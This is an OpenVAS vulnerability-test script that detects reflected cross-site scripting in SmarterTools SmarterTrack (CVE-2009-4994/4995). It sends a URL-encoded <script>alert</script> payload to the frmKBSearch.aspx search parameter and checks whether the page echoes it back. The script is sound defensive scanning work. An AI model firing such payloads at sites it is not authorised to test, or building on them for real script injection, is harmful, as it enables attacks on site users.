##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_smartertrack_mult_xss_vuln.nasl 14323 2019-03-19 13:19:09Z jschulte $
#
# SmarterTools SmarterTrack Cross-Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801453");
  script_version("$Revision: 14323 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-09-15 08:47:45 +0200 (Wed, 15 Sep 2010)");
  script_cve_id("CVE-2009-4994", "CVE-2009-4995");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("SmarterTools SmarterTrack Cross-Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/36172");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/52305");
  script_xref(name:"URL", value:"http://holisticinfosec.org/content/view/123/45/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports(9996);

  script_tag(name:"insight", value:"The flaws are due to the input passed to the 'search' parameter in
  'frmKBSearch.aspx' and email address to 'frmTickets.aspx' is not properly
  sanitised before being returned to the user.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"solution", value:"Upgrade to SmarterTools SmarterTrack version 4.0.3504.");
  script_tag(name:"summary", value:"This host is running SmarterTools SmarterTrack and is prone
  Cross-site scripting vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in context of an affected site.");
  script_tag(name:"affected", value:"SmarterTools SmarterTrack version prior to 4.0.3504");
  script_xref(name:"URL", value:"http://www.smartertools.com/smartertrack/help-desk-download.aspx");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

smartPort = "9996";
if(!get_port_state(smartPort)){
  exit(0);
}

sndReq = string("GET /Main/Default.aspx HTTP/1.1", "\r\n",
                    "Host: ", get_host_name(), "\r\n\r\n");
rcvRes = http_keepalive_send_recv(port:smartPort, data:sndReq);

if(">SmarterTrack" >< rcvRes )
{
  sndReq = string("GET /Main/frmKBSearch.aspx?search=%3Cscript%3Ealert(%22OpenVAS" +
                         "-XSS-Testing%22)%3C/script%3E HTTP/1.1", "\r\n",
                          "Host: ", get_host_name(), "\r\n\r\n");
  rcvRes = http_send_recv(port:smartPort, data:sndReq);
  if(rcvRes =~ "HTTP/1\.. 200" && '<script>alert("OpenVAS-XSS-Testing")</script>' >< rcvRes){
    security_message(smartPort);
  }
}
